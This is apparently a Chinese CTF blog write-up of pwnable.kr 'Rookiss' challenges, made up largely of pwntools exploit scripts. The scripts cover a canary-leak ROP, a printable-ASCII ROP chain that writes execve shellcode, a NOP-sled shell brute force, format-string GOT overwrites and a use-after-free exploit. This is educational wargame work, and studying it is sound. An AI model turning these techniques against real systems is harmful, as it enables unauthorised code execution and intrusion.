<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pwnable_2_Rookiss | Firework</title><meta name="keywords" content="Pwn,CTF"><meta name="author" content="Firework"><meta name="copyright" content="Firework"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="unlink远程服务器exp  本地ubuntu exp   brain fuckdo_brainfuck程序对指针p进行操作，可以基于此进行got表的覆盖 将menset覆盖为gets，将fgets覆盖为system md5 calculator​    canary由于sand()伪随机性导致的泄露，利用此ROP python3 12345678910111213141516171819202">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwnable_2_Rookiss">
<meta property="og:url" content="http://example.com/2021/10/18/Pwnable_2_Rookiss/index.html">
<meta property="og:site_name" content="Firework">
<meta property="og:description" content="unlink远程服务器exp  本地ubuntu exp   brain fuckdo_brainfuck程序对指针p进行操作，可以基于此进行got表的覆盖 将menset覆盖为gets，将fgets覆盖为system md5 calculator​    canary由于sand()伪随机性导致的泄露，利用此ROP python3 12345678910111213141516171819202">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fireworkxzww.top//pic/005BYxJSly1h0ko8f5r8ej314y0qqtcm.jpg">
<meta property="article:published_time" content="2021-10-17T17:24:39.000Z">
<meta property="article:modified_time" content="2022-03-25T16:53:03.000Z">
<meta property="article:author" content="Firework">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fireworkxzww.top//pic/005BYxJSly1h0ko8f5r8ej314y0qqtcm.jpg"><link rel="shortcut icon" href="https://i.loli.net/2021/04/08/2kj1dHCXRf7sGEo.jpg"><link rel="canonical" href="http://example.com/2021/10/18/Pwnable_2_Rookiss/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":30,"languages":{"author":"作者: Firework","link":"链接: ","source":"来源: Firework","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-03-26 00:53:03'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Firework" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2021/04/08/2kj1dHCXRf7sGEo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Firework</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pwnable_2_Rookiss</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-10-17T17:24:39.000Z" title="发表于 2021-10-18 01:24:39">2021-10-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-25T16:53:03.000Z" title="更新于 2022-03-26 00:53:03">2022-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Pwnable_2_Rookiss"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>远程服务器exp</p>
<p><img src="http://fireworkxzww.top//pic/image-20220117230323834.png" alt="image-20220117230323834"></p>
<p>本地ubuntu exp</p>
<p><img src="http://fireworkxzww.top//pic/image-20220117230641428.png" alt="image-20220117230641428"></p>
<p><img src="http://fireworkxzww.top//pic/image-20220117230712918.png" alt="image-20220117230712918"></p>
<h3 id="brain-fuck"><a href="#brain-fuck" class="headerlink" title="brain fuck"></a>brain fuck</h3><p>do_brainfuck程序对指针p进行操作，可以基于此进行got表的覆盖</p>
<p>将menset覆盖为gets，将fgets覆盖为system</p>
<h3 id="md5-calculator"><a href="#md5-calculator" class="headerlink" title="md5 calculator"></a>md5 calculator</h3><p>​    canary由于sand()伪随机性导致的泄露，利用此ROP</p>
<p>python3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">int</span>(time.time()))</span><br><span class="line"><span class="comment">#p = process(&#x27;./hash&#x27;)</span></span><br><span class="line">now = <span class="built_in">int</span>(time.time())+<span class="number">1</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9002</span>)</span><br><span class="line"><span class="built_in">print</span> (now)</span><br><span class="line"></span><br><span class="line">t = process(<span class="string">&#x27;./get_time&#x27;</span>)</span><br><span class="line">t.sendline(<span class="built_in">str</span>(now))</span><br><span class="line">v = t.recvline().decode().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">v = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>] + v[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">    v[i] = <span class="built_in">int</span>(v[i])</span><br><span class="line">t.close()</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">captcha = p.recvline().decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>][<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">p.sendline(captcha)</span><br><span class="line">canary = <span class="built_in">int</span>(captcha)-v[<span class="number">6</span>]+v[<span class="number">8</span>]-v[<span class="number">9</span>]-v[<span class="number">4</span>]+v[<span class="number">5</span>]-v[<span class="number">3</span>]-v[<span class="number">7</span>]</span><br><span class="line">canary = ctypes.c_uint(canary).value</span><br><span class="line"><span class="built_in">print</span> (canary)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload +=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x200</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span>*<span class="number">0xc</span></span><br><span class="line">payload += p32(<span class="number">0x08048880</span>) <span class="comment"># system plt</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>          <span class="comment">#The system() function has a feature that takes an argument from a distance of +4Bytes away.Very Important.</span></span><br><span class="line">payload += p32(<span class="number">0x0804B3E0</span>) <span class="comment"># g_buf</span></span><br><span class="line">payload = base64.b64encode(payload)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x300</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload +=<span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="simple-login"><a href="#simple-login" class="headerlink" title="simple login"></a>simple login</h3><p>just like flag says:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">control EBP, control ESP, control EIP, control the world~</span><br></pre></td></tr></table></figure>
<p>只能控制ebp的情况下:</p>
<p>leave指令完成以下内容：</p>
<ul>
<li>mov esp,ebp</li>
<li>pop ebp</li>
</ul>
<p>完成栈帧恢复</p>
<p>此后ret= pop eip成功控制返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x08049284</span>)</span><br><span class="line">payload += p32(<span class="number">0x0811EB40</span>)</span><br><span class="line">payload = b64encode(payload)</span><br></pre></td></tr></table></figure>
<h3 id="opt"><a href="#opt" class="headerlink" title="opt"></a>opt</h3><p>learn about ulimit</p>
<h3 id="ascii-easy"><a href="#ascii-easy" class="headerlink" title="ascii_easy"></a>ascii_easy</h3><p>ROPgadget的进阶用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --offset 0x5555e000 --badbytes &quot;00-1f|80-ff&quot; --ropchain --binary libc-2.15.so &gt;  out.txt</span><br></pre></td></tr></table></figure>
<p>one_gadget主要用来去查找动态链接库里execve(“/bin/sh”, rsp+0x70, environ)函数的地址</p>
<p>one_gadget进阶用法</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-261112.htm">https://bbs.pediy.com/thread-261112.htm</a></p>
<p> so库加载地址 0x5555e000</p>
<p>思路：</p>
<p>既然给定的so库是可写可执行的，可以利用 ROPgadget拼接write1或write2将shellcode写入so库上指定地址。最后将控制流跳转到该地址执行。</p>
<ul>
<li>找到符合条件的write2</li>
</ul>
<p><img src="http://fireworkxzww.top//pic/image-20220122023646178.png" alt="image-20220122023646178"></p>
<ul>
<li>找到pop edx和xor eax eax</li>
</ul>
<p><img src="http://fireworkxzww.top//pic/image-20220122023846416.png" alt="image-20220122023846416"></p>
<ul>
<li>找到用于脏字符处理的gadget</li>
</ul>
<p><img src="http://fireworkxzww.top//pic/image-20220122025228347.png" alt="image-20220122025228347"></p>
<p>准备工作结束:</p>
<p>exp</p>
<p>关键在于脏字符处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch &#x3D; &#39;i386&#39;</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_one(addr, c):</span><br><span class="line">    w &#x3D; &#39;&#39;</span><br><span class="line">    w +&#x3D; p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret</span><br><span class="line">    w +&#x3D; p32(addr)       # edx</span><br><span class="line">    w +&#x3D; p32(0x20202020) # edi</span><br><span class="line">    w +&#x3D; p32(0x55615d44) # pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d55 ; ret</span><br><span class="line">    if 0x20 &lt;&#x3D; ord(c) &lt;&#x3D;0x7f:</span><br><span class="line">        w +&#x3D; c + &#39;\x20\x20\x20&#39; # eax</span><br><span class="line">    elif ord(c) &lt; 0x20:</span><br><span class="line">        t &#x3D; chr(ord(c)+0x100-0x5f-0x5f)</span><br><span class="line">        w +&#x3D; t + &#39;\x20\x20\x20&#39; # eax</span><br><span class="line">        w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret</span><br><span class="line">        w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret</span><br><span class="line">    elif ord(c) &gt; 0x7f:</span><br><span class="line">        if ord(c)-0x5f &lt;&#x3D; 0x7f:</span><br><span class="line">            t &#x3D; chr(ord(c)-0x5f)</span><br><span class="line">            w +&#x3D; t + &#39;\x20\x20\x20&#39; # eax</span><br><span class="line">            w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret</span><br><span class="line">        else:</span><br><span class="line">            t &#x3D; chr(ord(c)-0x5f-0x5f)</span><br><span class="line">            w +&#x3D; t + &#39;\x20\x20\x20&#39; # eax</span><br><span class="line">            w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret</span><br><span class="line">            w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret</span><br><span class="line">    w +&#x3D; p32(0x555e3773) # mov word ptr [edx], ax ; mov eax, edx ; ret</span><br><span class="line">    return w</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &#39;&#39;</span><br><span class="line">shellcode +&#x3D; &#39;\x31\xd2&#39; # xor edx, edx</span><br><span class="line">shellcode +&#x3D; &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&#39;</span><br><span class="line">shellcode +&#x3D; &#39;\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &#39;A&#39;*0x20</span><br><span class="line">start_addr &#x3D; 0x55606055</span><br><span class="line">for i in range(len(shellcode)):</span><br><span class="line">    payload +&#x3D; write_one(start_addr+i, shellcode[i])</span><br><span class="line">payload +&#x3D; p32(start_addr)</span><br><span class="line"></span><br><span class="line">p &#x3D; process([&#39;.&#x2F;ascii_easy&#39;, payload])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="tiny-easy"><a href="#tiny-easy" class="headerlink" title="tiny_easy"></a>tiny_easy</h3><p>程序跳转 argv[0]前四个字节地址，通过设置executable参数，可以自定义argv[0]。进而可以控制返回地址。</p>
<ul>
<li><strong>executable</strong> (<a target="_blank" rel="noopener" href="https://docs.python.org/2.7/library/functions.html#str"><em>str</em></a>) – Path to the binary to execute. If <code>None</code>, uses <code>argv[0]</code>. Cannot be used with <code>shell</code>.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;\x90&quot; * 8000 + shellcraft.sh()</span><br><span class="line"></span><br><span class="line">arg &#x3D; [p32(0xffeec9d4)]</span><br><span class="line">for i in range(1,0x100):</span><br><span class="line">    arg.append(payload)</span><br><span class="line">while True:</span><br><span class="line">    p &#x3D; process(arg, executable&#x3D;&quot;.&#x2F;tiny_easy&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line">#What a tiny task :) good job!</span><br></pre></td></tr></table></figure>
<p><img src="http://fireworkxzww.top//pic/image-20220123034728560.png" alt="image-20220123034728560"></p>
<h3 id="fsb"><a href="#fsb" class="headerlink" title="fsb"></a>fsb</h3><p>Ez  Format String</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Have you ever saw an example of utilizing [n] format character?? :(</span><br></pre></td></tr></table></figure>
<p><img src="http://fireworkxzww.top//pic/image-20220123195158999.png" alt="image-20220123195158999"></p>
<p><img src="http://fireworkxzww.top//pic/image-20220123195531279.png" alt="image-20220123195531279"></p>
<p>存在跳板指针的分析如下</p>
<p><img src="http://fireworkxzww.top//pic/image-20220123202144402.png" alt="image-20220123202144402"></p>
<p>栈上有指向环境变量地址和argv的指针，而环境变量和参数已经被置空所以存在这两个跳板指针。</p>
<ul>
<li>思路1</li>
</ul>
<p>覆写printf的Got表(0x804a004)为execve地址(0x80486ab)即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.&#x2F;fsb &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">%134520836c%14$n</span><br><span class="line">%134514347c%20$n</span><br></pre></td></tr></table></figure>
<ul>
<li>思路2</li>
</ul>
<p>修改key值为0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fmt1 = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x0804A060</span>) + <span class="string">&#x27;c%14$n&#x27;</span></span><br><span class="line">fmt2 = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x0804A064</span>) + <span class="string">&#x27;c%15$n&#x27;</span></span><br><span class="line">write1 = <span class="string">&#x27;%20$n&#x27;</span></span><br><span class="line">write2 = <span class="string">&#x27;%21$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/home/fsb/fsb&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)</span><br><span class="line">p.sendline(fmt1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)</span><br><span class="line">p.sendline(write1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)</span><br><span class="line">p.sendline(fmt2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;)\n&#x27;</span>)</span><br><span class="line">p.sendline(write2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;key : \n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h3><p>Ez  整数溢出+UAF</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./dragon&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>, <span class="number">9004</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Knight\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invincible.\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Knight\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">4</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invincible.\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invincible.\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Invincible.\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;As:\n&#x27;</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0x08048DBF</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>很巧妙的栈帧结构分析，由于esp靠近shellcode，在正常执行shellcode的过程中堆栈操作修改了放有shellcode的数组。</p>
<p>将push eax 改为leave即可，但是会造成execve函数执行时参数压栈有问题，传入的参数不是 /bin/sh </p>
<p>可以通过创建对应文件，将sh填入文件即可</p>
<p><img src="http://fireworkxzww.top//pic/image-20220124004439909.png" alt="image-20220124004439909"></p>
